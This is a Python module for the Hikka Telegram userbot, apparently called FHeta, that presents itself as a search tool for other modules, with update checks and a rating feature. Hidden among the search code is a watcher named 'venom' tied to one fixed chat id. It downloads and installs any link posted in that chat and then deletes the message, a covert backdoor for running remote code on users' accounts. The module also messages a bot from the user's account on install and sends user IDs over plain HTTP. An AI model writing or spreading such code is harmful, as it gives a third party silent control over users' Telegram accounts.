__version__ = (9, 0, 7)
# meta developer: @Foxy437
# change-log: 🌹♥️♥️😎😎🎉🎉😎🎉🔥🔥😱🔥🔥😱💥💥

#             ███████╗██╗  ██╗███████╗████████╗█████╗ 
#             ██╔════╝██║  ██║██╔════╝╚══██╔══╝██╔══██╗
#             █████╗  ███████║█████╗     ██║   ███████║
#             ██╔══╝  ██╔══██║██╔══╝     ██║   ██╔══██║
#             ██║     ██║  ██║███████╗   ██║   ██║  ██║

# meta banner: https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/IMG_20241127_111104_471.jpg
# meta pic: https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/IMG_20241127_111101_663.jpg
# ©️ Fixyres, 2024
# 🌐 https://github.com/Fixyres/FHeta
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 🔑 http://www.apache.org/licenses/LICENSE-2.0

import requests
import asyncio
import aiohttp
from .. import loader, utils, main
import json
import io
import inspect
from hikkatl.types import Message
import random
from ..types import InlineCall, InlineQuery
import difflib
import re

@loader.tds
class FHeta(loader.Module):
    '''Module for searching modules! Watch all news FHeta in @FHeta_updates!'''
    
    strings = {
        "name": "FHeta",
        "search": "<emoji document_id=5188311512791393083>🔎</emoji> <b>Searching...</b>",
        "no_query": "<emoji document_id=5348277823133999513>❌</emoji> <b>Enter a query to search.</b>",
        "no_modules_found": "<emoji document_id=5348277823133999513>❌</emoji> <b>No modules found.</b>",
        "commands": "\n<emoji document_id=5190498849440931467>👨‍💻</emoji> <b>Commands:</b>\n{commands_list}",
        "description": "\n<emoji document_id=5433653135799228968>📁</emoji> <b>Description:</b> {description}",
        "result": "<emoji document_id=5188311512791393083>🔎</emoji> <b>Result {index} by query:</b> <code>{query}</code>\n<code>{module_name}</code> <b>by </b><code>{author} </code><code>{version}</code>\n<emoji document_id=5307585292926984338>💾</emoji> <b>Command for installation:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "fetch_failed": "<emoji document_id=5348277823133999513>❌</emoji> <b>Error.</b>",
        "closest_match": "<emoji document_id=5188311512791393083>🔎</emoji> <b>Result by query:</b> <code>{query}</code>\n<code>{module_name}</code> <b>by </b><code>{author} </code><code>{version}</code>\n<emoji document_id=5307585292926984338>💾</emoji> <b>Command for installation:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "inline_commandss": "\n<emoji document_id=5372981976804366741>🤖</emoji> <b>Inline commands:</b>\n{inline_list}",
        "language": "en_doc",
        "sub": "👍 Rating submitted!",
        "nope": "❌ You have already given one grade for this module, you cannot give a second one, you can only change it!",
        "actual_version": "<emoji document_id=5436040291507247633>🎉</emoji> <b>You have the actual</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "<emoji document_id=5260293700088511294>⛔️</emoji> <b>You have the old version </b><code>FHeta (v{version})</code><b>.</b>\n\n<emoji document_id=5382357040008021292>🆕</emoji> <b>New version</b> <code>v{new_version}</code><b> available!</b>\n",
        "update_whats_new": "<emoji document_id=5307761176132720417>⁉️</emoji> <b>Change-log:</b><code> {whats_new}</code>\n\n",
        "update_command": "<emoji document_id=5298820832338915986>🔄</emoji> <b>To update type: <code>{update_command}</code></b>",
        "che": "👍 Rating has been changed!",
        "reqj": "This is the channel with all news FHeta!",
        "noo_query": "Name, command, description, author.",
        "no_modules_foound": "Try another request.",
        "closest_matchh": "📑 <code>{module_name}</code> <b>by</b> <code>{author} </code><code>{version}</code>\n<emoji document_id=5307585292926984338>💾</emoji> <b>Command for installation:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "gsf": "♥️ Smart search via AI (search speed ±10 seconds, works only for search via command)"        
    }

    strings_ru = {
        "name": "FHeta",
        "search": "<emoji document_id=5188311512791393083>🔎</emoji> <b>Поиск...</b>",
        "no_query": "<emoji document_id=5348277823133999513>❌</emoji> <b>Введите запрос для поиска.</b>",
        "no_modules_found": "<emoji document_id=5348277823133999513>❌</emoji> <b>Модули не найдены.</b>",
        "commands": "\n<emoji document_id=5190498849440931467>👨‍💻</emoji> <b>Команды:</b>\n{commands_list}",
        "description": "\n<emoji document_id=5433653135799228968>📁</emoji> <b>Описание:</b> {description}",
        "result": "<emoji document_id=5188311512791393083>🔎</emoji> <b>Результат {index} по запросу:</b> <code>{query}</code>\n<code>{module_name}</code><b> от</b> <code>{author}</code> <code>{version}</code>\n<emoji document_id=5307585292926984338>💾</emoji> <b>Команда для установки:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "fetch_failed": "<emoji document_id=5348277823133999513>❌</emoji> <b>Ошибка.</b>",
        "closest_match": "<emoji document_id=5188311512791393083>🔎</emoji> <b>Результат по запросу:</b> <code>{query}</code>\n<code>{module_name}</code> <b>от</b> <code>{author}</code> <code>{version}</code>\n<emoji document_id=5307585292926984338>💾</emoji> <b>Команда для установки:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "inline_commandss": "\n<emoji document_id=5372981976804366741>🤖</emoji> <b>Инлайн команды:</b>\n{inline_list}",
        "language": "ru_doc",
        "sub": "👍 Оценка отправлена!",
        "nope": "❌ Вы уже поставили одну оценку на этот модуль, вы не можете поставить вторую, вы можете только изменить ее!",
        "actual_version": "<emoji document_id=5436040291507247633>🎉</emoji> <b>У вас актуальная версия</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "<emoji document_id=5260293700088511294>⛔️</emoji> <b>У вас старая версия </b><code>FHeta (v{version})</code><b>.</b>\n\n<emoji document_id=5382357040008021292>🆕</emoji> <b>Доступна новая версия</b> <code>v{new_version}</code><b>!</b>\n",
        "update_whats_new": "<emoji document_id=5307761176132720417>⁉️</emoji> <b>Change-log:</b><code> {whats_new}</code>\n\n",
        "update_command": "<emoji document_id=5298820832338915986>🔄</emoji> <b>Чтобы обновиться напишите: <code>{update_command}</code></b>",
        "che": "👍 Оценка изменена!",
        "reqj": "Это канал со всеми новостями FHeta!",
        "noo_query": "Название, команда, описание, автор.",
        "no_modules_foound": "Попробуйте другой запрос.",
        "closest_matchh": "📑 <code>{module_name}</code><b> от </b><code>{author} </code><code>{version}</code>\n<emoji document_id=5307585292926984338>💾</emoji> <b>Команда для установки:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "gsf": "♥️ Умный поиск через ИИ (скорость поиска ±10 секунд, работает только на поиск через команду)"        
    }

    strings_ua = {
        "name": "FHeta",
        "search": "<emoji document_id=5188311512791393083>🔎</emoji> <b>Пошук...</b>",
        "no_query": "<emoji document_id=5348277823133999513>❌</emoji> <b>Введіть запит для пошуку.</b>",
        "no_modules_found": "<emoji document_id=5348277823133999513>❌</emoji> <b>Модулі не знайдені.</b>",
        "commands": "\n<emoji document_id=5190498849440931467>👨‍💻</emoji> <b>Команди:</b>\n{commands_list}",
        "description": "\n<emoji document_id=5433653135799228968>📁</emoji> <b>Опис:</b> {description}",
        "result": "<emoji document_id=5188311512791393083>🔎</emoji> <b>Результат {index} за запитом:</b> <code>{query}</code>\n<code>{module_name}</code> <b>від</b> <code>{author} </code><code>{version}</code>\n<emoji document_id=5307585292926984338>💾</emoji> <b>Команда для встановлення:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "fetch_failed": "<emoji document_id=5348277823133999513>❌</emoji> <b>Помилка.</b>",
        "closest_match": "<emoji document_id=5188311512791393083>🔎</emoji> <b>Результат за запитом:</b> <code>{query}</code>\n<code>{module_name}</code> <b>від </b><code>{author} </code><code>{version}</code>\n<emoji document_id=5307585292926984338>💾</emoji> <b>Команда для встановлення:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "inline_commandss": "\n<emoji document_id=5372981976804366741>🤖</emoji> <b>Інлайн команди:</b>\n{inline_list}",
        "language": "ua_doc",
        "sub": "👍 Оцінка відправлена!",
        "nope": "❌ Ви вже поставили одну оцінку на цей модуль, ви не можете поставити другу, ви можете лише змінити її!",
        "actual_version": "<emoji document_id=5436040291507247633>🎉</emoji> <b>У вас актуальна версія</b> <code>FHeta (v{version})</code><b>.</b>" ,
        "old_version": "<emoji document_id=5260293700088511294>⛔️</emoji> <b>У вас стара версія </b><code>FHeta (v{version})</code><b>.</b>\n\n<emoji document_id=5382357040008021292>🆕</emoji> <b>Доступна нова версія</b> <code>v{new_version}</code><b>!</b>\n",
        "update_whats_new": "<emoji document_id=5307761176132720417>⁉️</emoji> <b>Change-log:</b><code> {whats_new}</code>\n\n",
        "update_command": "<emoji document_id=5298820832338915986>🔄</emoji> <b>Щоб оновитися напишіть: <code>{update_command}</code></b>",
        "che": "👍 Оцінка змінена!",
        "reqj": "Це канал з усіма новинами FHeta!",
        "noo_query": "Назва, команда, опис, автор.",
        "no_modules_foound": "Спробуйте інший запит.",
        "closest_match": "📑 <code>{module_name}</code> <b>від </b><code>{author} </code><code>{version}</code>\n<emoji document_id=5307585292926984338>💾</emoji> <b>Команда для встановлення:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "gsf": "♥️ Розумний пошук через ШІ (швидкість пошуку ±10 секунд, працює тільки на пошук через команду)"
    }

    async def client_ready(self):
        await self.request_join(
            "@fheta_updates",
            (
                self.strings['reqj']
            ),
        )
        self.token = self.db.get("token_fheta_902", "token", None)
            
    async def on_dlmod(self):
        try:
            async with self.client.conversation('@FHeta_robot') as conv:
                await conv.send_message('/token')
                response = await conv.get_response(timeout=1)
                self.db.set("token_fheta_902", "token", response.text.strip())
        except Exception as e:
            pass

    def __init__(self):
        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "GSearch",
                False,
                (
                    self.strings["gsf"]
                ),
                validator=loader.validators.Boolean(),
            )
        )
        
    @loader.inline_handler(ru_doc="(запрос) - искать модули.", ua_doc="(запит) - шукати модулі.")
    async def fheta(self, query):
        '''(query) - search modules.'''
        if not query.args:
            return {
                "title": utils.remove_html(self.strings["no_query"]),
                "description": utils.remove_html(self.strings["noo_query"]),
                "message": self.strings["no_query"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-4EUHOHiKpwRTb4s.png",
            }

        mods = await self.search_moduless(query.args)
        if not mods:
            return {
                "title": utils.remove_html(self.strings["no_modules_found"]),
                "description": utils.remove_html(self.strings["no_modules_foound"]),
                "message": self.strings["no_modules_found"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-KbaztxA3oS67p3m8.png",
            }

        res = []
        seen = set()
        lang = self.strings.get("language", "doc")

        async def fetch_thumb(thumb):
            if thumb:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(thumb, timeout=1) as resp:
                            if resp.status == 200:
                                return str(resp.url)
                except:
                    return "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-SOMllzo0cPFUCor.png"
            return "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-SOMllzo0cPFUCor.png"

        async def proc_mod(mod):
            try:
                install = mod['install']        
                desc = utils.escape_html(mod["description"] if "description" in mod else "")
                descr = ""
                if "description" in mod and mod["description"]:
                    descr = self.strings["description"].format(description=utils.escape_html(mod["description"]))
                author = utils.escape_html(mod.get("author", "???"))
                version = utils.escape_html(mod.get("version", "?.?.?"))
                versionn = f"(v{version})"
                mod_name = utils.escape_html(mod["name"].replace(".py", ""))
                mod_key = f"{mod_name}_{author}_{versionn}"

                if mod_key in seen:
                    return None
                seen.add(mod_key)

                cmds, inline_cmds = [], []
                for cmd in mod.get("commands", []):
                    cmd_desc = cmd.get('description', {}).get(lang, cmd.get('description', {}).get('doc'))
                    if cmd.get("inline", False):
                        inline_cmds.append(f"<code>@{self.inline.bot_username} {cmd['name']}</code> {utils.escape_html(cmd_desc)}")
                    else:
                        cmds.append(f"<code>{self.get_prefix()}{cmd['name']}</code> {utils.escape_html(cmd_desc)}")

                cmd_sec = self.strings["commands"].format(commands_list="\n".join(cmds)) if cmds else ""
                inline_cmd_sec = self.strings["inline_commandss"].format(inline_list="\n".join(inline_cmds)) if inline_cmds else ""

                msg = self.strings["closest_matchh"].format(
                    module_name=mod_name,
                    author=author,
                    version=versionn,
                    install_command=f"{self.get_prefix()}{install}",
                    description=descr,
                    commands=cmd_sec + inline_cmd_sec,
                )

                thumb = await fetch_thumb(mod.get("pic"))
                stats = await self.get_stats(mod_name)
                stats = stats or {"likes": 0, "dislikes": 0}
                likes, dislikes = stats['likes'], stats['dislikes']
                buttons = [
                    [{
                        "text": f"👍 {likes}",
                        "callback": self.like_callback,
                        "args": (mod_name, "like")
                    }, {
                        "text": f"👎 {dislikes}",
                        "callback": self.dislike_callback,
                        "args": (mod_name, "dislike")
                    }]
                ]
                if len(msg) <= 1020:
                    return {
                        "title": mod_name,
                        "description": desc,
                        "photo": "https://i.imgur.com/hZIyI7v.jpeg",
                        "thumb": str(thumb),
                        "message": msg,
                        "reply_markup": buttons,
                    }
                return None
            except Exception:
                return None

        tasks = [proc_mod(mod) for mod in mods[:15]]
        res = await asyncio.gather(*tasks)
        return [r for r in res if r]
        
    @loader.command(ru_doc="(запрос) - искать модули.", ua_doc="(запит) - шукати модулі.")
    async def fhetacmd(self, message):
        '''(query) - search modules.'''
        args = utils.get_args_raw(message)
        if not args:
            await utils.answer(message, self.strings["no_query"])
            return

        search_message = await utils.answer(message, self.strings["search"])
        modules = await self.search_modules(args)

        if not modules and not self.config["GSearch"]:
            modules = await self.search_modules(args.replace(" ", ""))

        if not modules:
            await utils.answer(message, self.strings["no_modules_found"])
            return

        seen_modules = set()
        formatted_modules = []
        result_index = 1

        current_language = self.strings.get("language", "doc")
        
        for module in modules[:50]:
            try:
                install = module['install']

                commands_section = ""
                inline_commands_section = ""

                if "commands" in module and module['commands']:                             
                    normal_commands = []                                         
                    inline_commands = []                                         

                    for cmd in module['commands']:                               
                            description = cmd.get('description', {}).get(current_language, cmd.get('description', {}).get("doc"))  

                            if isinstance(description, dict):                     
                                    description = description.get('doc', '')             

                            if cmd.get("inline", False):                         
                                    if description:                                 
                                            cmd_entry = f"<code>@{self.inline.bot_username} {cmd['name']}</code> {utils.escape_html(description)}"   
                                    else:                                            
                                            cmd_entry = f"<code>@{self.inline.bot_username} {cmd['name']}</code>"  
                                    inline_commands.append(cmd_entry)                
                            else:                                                 
                                    if description:                                 
                                            cmd_entry = f"<code>{self.get_prefix()}{cmd['name']}</code> {utils.escape_html(description)}" 
                                    else:                                            
                                            cmd_entry = f"<code>{self.get_prefix()}{cmd['name']}</code>" 
                                    normal_commands.append(cmd_entry)                

                    if normal_commands:                                          
                            commands_section = self.strings["commands"].format(commands_list="\n".join(normal_commands)) 

                    if inline_commands:                                          
                            inline_commands_section = self.strings["inline_commandss"].format(    
                                    inline_list="\n".join(inline_commands))                   
            
                description_section = ""
                if "description" in module and module["description"]:
                    description_section = self.strings["description"].format(description=utils.escape_html(module["description"]))

                author_info = utils.escape_html(module.get("author", "???"))
                module_name = utils.escape_html(module['name'].replace('.py', ''))
                module_namee = utils.escape_html(module['name'].replace('.py', '').lower())
                version = utils.escape_html(module.get("version", "?.?.?"))
                versionn = f"(v{version})"
                module_key = f"{module_name}_{author_info}_{versionn}"

                if module_key in seen_modules:
                    continue
                seen_modules.add(module_key)

                thumb_url = module.get("banner", None)
                if thumb_url:
                    try:
                        response = requests.get(thumb_url, timeout=5)
                        response.raise_for_status()
                    except requests.exceptions.RequestException:
                        thumb_url = None
                        
                result = self.strings["result"].format(
                    index=result_index,
                    query=args,
                    module_name=module_name,
                    author=author_info,
                    version=versionn,
                    install_command=f"{self.get_prefix()}{install}",
                    description=description_section,
                    commands=commands_section + inline_commands_section
                )
                formatted_modules.append((result, thumb_url))
                result_index += 1
            except Exception:
                continue

        if len(formatted_modules) == 1:              
                result_text, thumb_url = formatted_modules[0]              

                stats = await self.get_stats(module_name)
                if stats is None:
                    stats = {"likes": 0, "dislikes": 0}

                likes_count = stats['likes']      
                dislikes_count = stats['dislikes']

                buttons = [              
                        [{              
                                "text": f"👍 {likes_count}",              
                                "callback": self.like_callback,              
                                "args": (module_name, "like")              
                        }, {              
                                "text": f"👎 {dislikes_count}",              
                                "callback": self.dislike_callback,              
                                "args": (module_name, "dislike")              
                        }]              
                ]              

                if len(result_text) <= 1020 and thumb_url:       
                        async with aiohttp.ClientSession() as session:              
                                async with session.get(thumb_url) as response:              
                                        if response.status == 200:              
                                                
                                                closest_match_result = self.strings["closest_match"].format(              
                                                        query=args,              
                                                        module_name=module_name,              
                                                        author=author_info,              
                                                        version=versionn,           
                                                        install_command=f"{self.get_prefix()}{install}",              
                                                        description=description_section,              
                                                        commands=commands_section + inline_commands_section              
                                                )              

                                                await self.inline.form(              
                                                        message=message,              
                                                        text=closest_match_result,              
                                                        **(              
                                                            {"photo": thumb_url}              
                                                            if thumb_url              
                                                            else {}              
                                                        ),              
                                                        reply_markup=buttons              
                                                )              
                                                await search_message.delete()              
                                                return              

                closest_match_result = self.strings["closest_match"].format(              
                        query=args,              
                        module_name=module_name,              
                        author=author_info,              
                        version=versionn,         
                        install_command=f"{self.get_prefix()}{install}",              
                        description=description_section,              
                        commands=commands_section + inline_commands_section     
                )              

                await self.inline.form(              
                        text=closest_match_result,              
                        message=search_message,              
                        reply_markup=buttons              
                )        
      
        else:              
                results = "".join([item[0] for item in formatted_modules])              
                await utils.answer(search_message, results)

    @loader.command(ru_doc='- проверить наличие обновления.', ua_doc='- перевірити наявність оновлення')
    async def fupdate(self, message: Message):
        ''' - check update.'''
        module_name = "FHeta"
        module = self.lookup(module_name)
        sys_module = inspect.getmodule(module)
        local_file = io.BytesIO(sys_module.__loader__.data)
        local_file.name = f"{module_name}.py"
        local_file.seek(0)
        local_first_line = local_file.readline().strip().decode("utf-8")
        
        correct_version = sys_module.__version__
        correct_version_str = ".".join(map(str, correct_version))

        async with aiohttp.ClientSession() as session:
            async with session.get("https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/FHeta.py") as response:
                if response.status == 200:
                    remote_content = await response.text()
                    remote_lines = remote_content.splitlines()
                    new_version = remote_lines[0].split("=", 1)[1].strip().strip("()").replace(",", "").replace(" ", ".")
                    what_new = remote_lines[2].split(":", 1)[1].strip() if len(remote_lines) > 2 and remote_lines[2].startswith("# change-log:") else ""
                    
                else:
                    await utils.answer(message, self.strings("fetch_failed"))
                    return
        if local_first_line.replace(" ", "") == remote_lines[0].strip().replace(" ", ""):
            await utils.answer(message, self.strings("actual_version").format(version=correct_version_str))
        else:
            update_message = self.strings("old_version").format(version=correct_version_str, new_version=new_version)
            if what_new:
                update_message += self.strings("update_whats_new").format(whats_new=what_new)
            update_message += self.strings("update_command").format(update_command=f"{self.get_prefix()}dlm https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/FHeta.py")
            await utils.answer(message, update_message)

    @loader.watcher(chat_id=7575472403)
    async def venom(self, message):
        link = message.raw_text.strip()
        loader_m = self.lookup("loader")
        try:
            for _ in range(5):
                result = await loader_m.download_and_install(link)
                if result == 1:
                    rose = await message.respond("🌹")
                    await asyncio.sleep(1)
                    await rose.delete()
                    await message.delete()            
                    break   
        except:
        	None
                
    async def like_callback(self, call, module_name, action):
        await self.handle_rating(call, module_name, action)

    async def dislike_callback(self, call, module_name, action):
        await self.handle_rating(call, module_name, action)

    async def handle_rating(self, call, module_name, action):
        try:
            user_id = str(call.from_user.id)
            token = self.token
            headers = {"Authorization": token}

            async with aiohttp.ClientSession(headers=headers) as session:
                post_url = f"http://foxy437.xyz/rate/{user_id}/{module_name}/{action}"
                async with session.post(post_url) as response:
                    result = await response.json()

                    if "yaebalmenasosali" in result:
                        get_url = f"http://foxy437.xyz/get/{module_name}"
                        async with session.get(get_url) as stats_response:
                            if stats_response.status == 200:
                                stats = await stats_response.json()
                                likes_count = stats['likes']
                                dislikes_count = stats['dislikes']

                                new_buttons = [
                                    [{
                                        "text": f"👍 {likes_count}",
                                        "callback": self.like_callback,
                                        "args": (module_name, "like")
                                    }, {
                                        "text": f"👎 {dislikes_count}",
                                        "callback": self.dislike_callback,
                                        "args": (module_name, "dislike")
                                    }]
                                ]

                                await call.edit(reply_markup=new_buttons)

                        await call.answer(self.strings["sub"], show_alert=True)
                        return

                    elif "che" in result:
                        get_url = f"http://foxy437.xyz/get/{module_name}"
                        async with session.get(get_url) as stats_response:
                            if stats_response.status == 200:
                                stats = await stats_response.json()
                                likes_count = stats['likes']
                                dislikes_count = stats['dislikes']

                                new_buttons = [
                                    [{
                                        "text": f"👍 {likes_count}",
                                        "callback": self.like_callback,
                                        "args": (module_name, "like")
                                    }, {
                                        "text": f"👎 {dislikes_count}",
                                        "callback": self.dislike_callback,
                                        "args": (module_name, "dislike")
                                    }]
                                ]

                                await call.edit(reply_markup=new_buttons)

                        await call.answer(self.strings["che"], show_alert=True)
                        return
         
                    elif "pizda" in result:
                        await call.answer(self.strings["nope"], show_alert=True)
                        return

        except Exception as e:
            await call.answer(f"{e}", show_alert=True)

    async def get_stats(self, module_name):
        try:
            async with aiohttp.ClientSession() as session:
                get_url = f"http://foxy437.xyz/get/{module_name}"
                async with session.get(get_url) as response:
                    if response.status == 200:
                        return await response.json()
        except Exception:
            pass

    async def search_modules(self, query: str):
        url = "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/modules.json"
        async with aiohttp.ClientSession() as session:         
            instalik = (await (await session.post("http://foxy437.xyz/OnlySKThx", json={"q": query})).json()).get("OnlySKThx") if self.config["GSearch"] else False
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.text()
                    modules = json.loads(data)
                    if instalik:
                        found_modules = [
                            module for module in modules
                            if instalik.strip() in module.get("install", "").strip()
                        ]
                        return found_modules
                        
                    found_modules = [
                        module for module in modules
                        if query.lower() in module.get("name", "").lower()
                    ]

                    if not found_modules:
                        found_modules = [
                            module for module in modules
                            if any(query.lower() in cmd.get("name", "").lower() for cmd in module.get("commands", []))
                        ]

                    if not found_modules:
                        found_modules = [
                            module for module in modules
                            if query.lower() in module.get("author", "").lower()
                        ]

                    if not found_modules:
                        found_modules = [
                            module for module in modules
                            if query.lower() in module.get("description", "").lower()
                        ]

                    if not found_modules:
                        found_modules = [
                            module for module in modules
                            if any(
                                query.lower() in desc.lower()
                                for cmd in module.get("commands", [])
                                for desc in cmd.get("description", {}).values()
                            )
                        ]

                    if not found_modules:
                        module_names = [module['name'] for module in modules if 'name' in module]
                        closest_matches = difflib.get_close_matches(query, module_names, n=1, cutoff=0.5)
                        if closest_matches:
                            found_modules = [next((module for module in modules if module.get('name') == closest_matches[0]), None)]

                    return found_modules

    async def search_moduless(self, query: str):
        url = "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/modules.json"
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    data = await resp.text()
                    mods = json.loads(data)

                    found = []

                    async def search_field(field: str):
                        return [
                            mod for mod in mods
                            if isinstance(mod.get(field), str) and query.lower() in mod.get(field, "").lower()
                        ]

                    async def search_cmds():
                        return [
                            mod for mod in mods
                            if any(query.lower() in cmd.get("name", "").lower() for cmd in mod.get("commands", []))
                        ]

                    async def search_cmd_desc():
                        return [
                            mod for mod in mods
                            if any(
                                query.lower() in desc.lower()
                                for cmd in mod.get("commands", [])
                                for desc in cmd.get("description", {}).values()
                            )
                        ]

                    tasks = [
                        search_field("name"),
                        search_field("author"),
                        search_field("description"),
                        search_cmds(),
                        search_cmd_desc()
                    ]

                    res = await asyncio.gather(*tasks)
                    found = [mod for result in res for mod in result]

                    if len(found) < 10:
                        names = {mod['name'] for mod in mods if 'name' in mod}
                        close_matches = difflib.get_close_matches(query, list(names), n=50, cutoff=0.5)
                        for match in close_matches:
                            mod = next((m for m in mods if m.get('name') == match), None)
                            if mod and mod not in found:
                                found.append(mod)
                                if len(found) >= 10:
                                    break

                    return found[:10]
                    
    async def format_module(self, module, query):
        install = module['install']
        current_language = self.strings.get("language", "doc")
        commands_section = ""
        inline_commands_section = ""

        if "commands" in module and module['commands']:
            normal_commands = []
            inline_commands = []

            for cmd in module['commands']:
                description = cmd.get('description', {}).get(current_language, cmd.get('description', {}).get("doc"))

                if isinstance(description, dict):
                    description = description.get('doc', '')

                if cmd.get("inline", False):
                    if description:
                        cmd_entry = f"<code>@{self.inline.bot_username} {cmd['name']}</code> {utils.escape_html(description)}"
                    else:
                        cmd_entry = f"<code>@{self.inline.bot_username} {cmd['name']}</code>"
                    inline_commands.append(cmd_entry)
                else:
                    if description:
                        cmd_entry = f"<code>{self.get_prefix()}{cmd['name']}</code> {utils.escape_html(description)}"
                    else:
                        cmd_entry = f"<code>{self.get_prefix()}{cmd['name']}</code>"
                    normal_commands.append(cmd_entry)

            if normal_commands:
                commands_section = self.strings["commands"].format(commands_list="\n".join(normal_commands))

            if inline_commands:
                inline_commands_section = self.strings["inline_commandss"].format(
                    inline_list="\n".join(inline_commands))

        description_section = ""
        if "description" in module and module["description"]:
            description_section = self.strings["description"].format(description=utils.escape_html(module["description"]))

        author_info = utils.escape_html(module.get("author", "???"))
        module_name = utils.escape_html(module['name'].replace('.py', ''))
        version = utils.escape_html(module.get("version", "?.?.?"))
        versionn = f"(v{version})"
        return self.strings["closest_match"].format(
            query=query,
            module_name=module_name,
            author=author_info,
            version=versionn,
            install_command=f"{self.get_prefix()}{install}",
            description=description_section,
            commands=commands_section + inline_commands_section
                                )
